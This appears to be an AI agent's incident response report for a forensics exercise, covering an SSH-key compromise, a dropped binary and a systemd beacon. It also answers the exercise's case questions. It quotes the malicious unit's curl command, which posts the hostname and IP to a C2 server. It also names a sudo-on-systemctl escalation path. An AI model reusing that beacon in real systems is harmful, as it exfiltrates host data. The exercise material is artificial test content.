All 8 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised on **April 14, 2026 at 03:17 UTC** via the **deploy** service account. An attacker with a stolen SSH private key logged in from the known C2 server **185.229.59.103**, performed reconnaissance, dropped a binary, and installed a persistent systemd beacon service that phones home to the same C2 IP every 10 minutes. The attacker's commands do not appear in any on-disk shell history — only the auth.log sudo audit trail records their actions.

## Attack Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| Apr 13 08:15 – Apr 13 16:44 | Normal activity by deploy, alice, bob (CI/CD, log tailing, apt updates) | auth.log:3-29 |
| **Apr 14 03:17:44** | deploy logs in from **185.229.59.103** (C2) using the CI runner's RSA key | auth.log:30 |
| Apr 14 03:18:02 | `sudo cat /etc/passwd` — reconnaissance | auth.log:32 |
| Apr 14 03:18:12 | `sudo cp /tmp/update /usr/local/bin/update` — binary drop | auth.log:35 |
| Apr 14 03:18:17 | `sudo chmod +x /usr/local/bin/update` | auth.log:36 |
| Apr 14 03:18:29 | `sudo tee /etc/systemd/system/system-updater.service` — persistence | auth.log:37 |
| Apr 14 03:18:44 | `sudo systemctl daemon-reload` | auth.log:38 |
| Apr 14 03:18:58 | `sudo systemctl enable system-updater.service` | auth.log:39 |
| Apr 14 03:19:03 | `sudo systemctl start system-updater.service` — beacon now active | auth.log:40 |
| Apr 14 03:20:51 | Attacker session closes | auth.log:41 |
| Apr 14 08:25 – 10:04 | Normal deploy/bob activity resumes (unaware of compromise) | auth.log:44-50 |

## Key Findings

### 1. Initial Access — Stolen SSH Key (CONFIRMED)
The attacker logged into the **deploy** account from **185.229.59.103** using publickey authentication. The key fingerprint (`RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ`) matches the legitimate CI runner key used from 10.0.1.50. No brute force was attempted — the attacker possessed the private key.

### 2. C2 IP — 185.229.59.103 (CONFIRMED)
Bulk IOC lookup identifies this IP as a **known C2 server** (tags: c2, beacon; confidence: high; source: findevil:scenario-02). It is both the attacker's login source and the beacon destination.

### 3. Persistence — Malicious systemd Service (CONFIRMED)
The attacker wrote `/etc/systemd/system/system-updater.service`, which runs as root and executes:
```
/usr/bin/curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"
```
It restarts every 600 seconds and is enabled at boot via `WantedBy=multi-user.target`.

### 4. Binary Drop (CONFIRMED)
A file was copied from `/tmp/update` to `/usr/local/bin/update` and made executable. The staged `/tmp/update` was likely uploaded before or during the SSH session.

### 5. Privilege Escalation Path (CONFIRMED)
The deploy account's sudoers entry (`etc/sudoers.d/deploy`) grants `NOPASSWD: /usr/bin/systemctl`. The attacker also ran `sudo cat`, `sudo cp`, `sudo chmod`, and `sudo tee` — suggesting deploy has broader sudo access than this single file documents.

### 6. Anti-Forensics — Missing Shell History (INFERENCE)
The attacker's 7 sudo commands from the 03:17–03:20 session do NOT appear in deploy's `.bash_history`, which contains only 15 legitimate CI/CD commands from earlier sessions. The attacker likely used non-interactive SSH command execution or selectively cleaned the history file.

## Shell History Analysis

Three accounts had shell history files; one account with login activity (bob) did not.

| Account | File | Size | Commands | Content |
|---|---|---|---|---|
| **root** | `root/.bash_history` | 80 B | 4 | Normal admin: `apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f` |
| **deploy** | `home/deploy/.bash_history` | 264 B | 15 | Legitimate CI/CD only: `git pull`, `npm ci`, `npm run build`, `npm test`, `git push`, etc. |
| **alice** | `home/alice/.bash_history` | 123 B | 6 | Normal user: `ls`, `cd /var/log`, `tail nginx access.log`, `journalctl`, `exit` |
| **bob** | *(no history file)* | — | — | Bob logged in twice (auth.log:15,48) but has no `.bash_history` on disk |

**None of the shell histories contain attacker commands.** The attacker's actions are recorded exclusively in the auth.log sudo entries (lines 32–40).

## Indicators of Compromise

| IOC | Type | Context |
|---|---|---|
| **185.229.59.103** | IP (C2 server) | SSH login source + beacon destination |
| **185.229.59.103:8443** | IP:port | C2 beacon endpoint |
| `system-updater.service` | systemd unit | Persistence mechanism |
| `/usr/local/bin/update` | File path | Dropped binary |
| `RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ` | SSH key fingerprint | Compromised CI runner key |

## Recommendations

1. **Immediately** disable the `system-updater.service` and remove the unit file
2. **Revoke** the deploy account's SSH key pair (`deploy@ci-runner-1` / `deploy@ci-backup`) and issue new keys
3. **Investigate** the CI runner at 10.0.1.50 for compromise — the private key was stolen from there
4. **Quarantine** `/usr/local/bin/update` for malware analysis
5. **Restrict** deploy's sudo access — NOPASSWD on bare `systemctl` is a known privesc vector
6. **Block** 185.229.59.103 at the network perimeter

---

## Case Questions

**Case Q1:** Shell histories were analyzed for three accounts: **root**, **deploy**, and **alice**. A fourth account, **bob**, had SSH logins in the auth.log but no `.bash_history` file on disk.

**Case Q2:** **No** — none of the shell histories show what the attacker did. Deploy's `.bash_history` contains only 15 legitimate CI/CD commands (git pull, npm ci, npm run build, etc.) from normal sessions. The attacker's actions (reconnaissance via `cat /etc/passwd`, binary drop to `/usr/local/bin/update`, installation and activation of the malicious `system-updater.service`) are recorded exclusively in the **auth.log sudo entries** (lines 32–40), not in any shell history file. This indicates the attacker either used non-interactive SSH command execution or cleaned the history.